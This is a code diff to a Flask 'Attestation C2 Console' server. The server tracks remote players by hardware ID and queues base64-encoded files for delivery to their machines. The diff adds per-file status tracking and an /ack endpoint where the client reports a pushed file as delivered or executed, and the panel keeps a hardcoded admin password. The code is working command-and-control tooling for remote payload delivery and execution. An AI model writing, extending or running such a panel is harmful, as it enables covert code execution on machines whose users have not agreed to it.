@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string, after_this_request
+from flask import Flask, request, jsonify, render_template_string
 import json
 import os
 import base64
@@ -31,7 +31,7 @@ def save_data(data):
         json.dump(data, f, indent=4)
 
 PLAYERS = load_data()
-PENDING_FILES = {}
+PENDING_FILES = {}  # hwid -> {'filename': name, 'content_b64': base64, 'status': 'queued'}
 
 ADMIN_PASSWORD = "admin123"  # CHANGE THIS!
 
@@ -81,6 +81,9 @@ DASHBOARD_HTML = """
         .status-msg.success { color: #0f0; background: #0a2a0a; }
         .status-msg.error { color: #f00; background: #2a0a0a; }
         .status-msg.info { color: #ff0; background: #2a2a0a; }
+        .file-status { font-size: 11px; color: #aaa; }
+        .file-status.delivered { color: #0f0; }
+        .file-status.executed { color: #0ff; }
         .timestamp { color: #888; font-size: 0.8em; }
         .username-list { font-weight: bold; color: #0f0; }
     </style>
@@ -106,7 +109,7 @@ DASHBOARD_HTML = """
             el.className = 'status-msg ' + type;
             if (type === 'success' || type === 'error') {
                 setTimeout(() => { 
-                    if (el.textContent === msg) { // only clear if not overwritten
+                    if (el.textContent === msg) {
                         el.textContent = '';
                         el.className = 'status-msg';
                     }
@@ -133,7 +136,7 @@ DASHBOARD_HTML = """
                 .then(res => res.json())
                 .then(data => {
                     if (data.status === 'ok') {
-                        setStatus(hwid, '✔ Sent!', 'success');
+                        setStatus(hwid, '✔ Queued', 'success');
                         input.value = '';
                         document.getElementById('fileName_' + hwid).textContent = 'No file chosen';
                     } else {
@@ -157,7 +160,7 @@ DASHBOARD_HTML = """
     <h1>⚡ Attestation C2 Console</h1>
     <p>Active players (last 20s): <span id="active-count">{{ active_players|length }}</span></p>
     <table>
-        <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Send File</th><th>Actions</th></tr></thead>
+        <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Send File</th><th>File Status</th><th>Actions</th></tr></thead>
         <tbody>
         {% for hwid, data in active_players.items() %}
         <tr class="active">
@@ -184,6 +187,14 @@ DASHBOARD_HTML = """
                     <button class="btn btn-file" onclick="uploadFile('{{ hwid }}')">Send</button>
                     <span class="status-msg" id="statusMsg_{{ hwid }}"></span>
                 </div>
+            </td>
+            <td>
+                {% set pending = pending_files.get(hwid) %}
+                {% if pending %}
+                    <span class="file-status">{{ pending.filename }} ({{ pending.status }})</span>
+                {% else %}
+                    <span class="file-status">No file</span>
+                {% endif %}
             </td>
             <td>
                 <form method="POST" action="/admin/kick" style="display:inline;">
@@ -304,7 +315,8 @@ def admin_panel():
     return render_template_string(DASHBOARD_HTML,
                                    active_players=active,
                                    all_players=all_players,
-                                   users=users)
+                                   users=users,
+                                   pending_files=PENDING_FILES)
 
 # ============================================
 # CLIENT API
@@ -337,11 +349,14 @@ def register():
         'settings_override': PLAYERS[hwid].get('settings_override', {})
     }
 
-    # Check for pending file
-    if hwid in PENDING_FILES:
-        response['file_payload'] = PENDING_FILES[hwid]
-        del PENDING_FILES[hwid]
-        print(f"[+] Delivered file to {hwid}")
+    # Check for pending file that hasn't been delivered yet
+    if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
+        response['file_payload'] = {
+            'filename': PENDING_FILES[hwid]['filename'],
+            'content_b64': PENDING_FILES[hwid]['content_b64']
+        }
+        PENDING_FILES[hwid]['status'] = 'delivered'
+        print(f"[+] Delivered file to {hwid}: {PENDING_FILES[hwid]['filename']}")
 
     if status == 'kicked':
         PLAYERS[hwid]['status'] = 'active'
@@ -349,6 +364,22 @@ def register():
 
     save_data(PLAYERS)
     return jsonify(response)
+
+# ============================================
+# ACKNOWLEDGMENT ENDPOINT
+# ============================================
+@app.route('/ack', methods=['POST'])
+def ack():
+    data = request.json
+    hwid = data.get('hwid')
+    filename = data.get('filename')
+    status = data.get('status', 'executed')
+    if hwid in PENDING_FILES and PENDING_FILES[hwid].get('filename') == filename:
+        PENDING_FILES[hwid]['status'] = status
+        print(f"[+] Acknowledgment from {hwid}: {filename} - {status}")
+    else:
+        print(f"[!] Acknowledgment from unknown HWID or file: {hwid} - {filename}")
+    return '', 204
 
 # ============================================
 # ADMIN ACTIONS
@@ -409,7 +440,11 @@ def upload_file():
     if hwid not in PLAYERS:
         print(f"[!] Unknown HWID: {hwid}")
         return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
-    PENDING_FILES[hwid] = {'filename': filename, 'content_b64': content_b64}
+    PENDING_FILES[hwid] = {
+        'filename': filename,
+        'content_b64': content_b64,
+        'status': 'queued'
+    }
     print(f"[+] File queued for {hwid}: {filename} ({len(content_b64)} chars)")
     return jsonify({'status': 'ok'}), 200
 
